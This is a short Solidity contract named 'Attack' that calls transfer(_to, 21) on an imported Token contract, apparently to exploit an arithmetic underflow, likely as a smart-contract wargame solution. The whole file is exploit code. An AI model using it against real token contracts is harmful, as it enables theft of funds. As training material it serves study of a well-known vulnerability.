pragma solidity ^0.6.0;

import "./Token.sol";

contract Attack {
    address public tokenAddress;

    constructor(address _tokenAddress) public {
        tokenAddress = _tokenAddress;
    }

    function attack(address _to) public {
        Token token = Token(tokenAddress);
        token.transfer(_to, 21);
    }
}
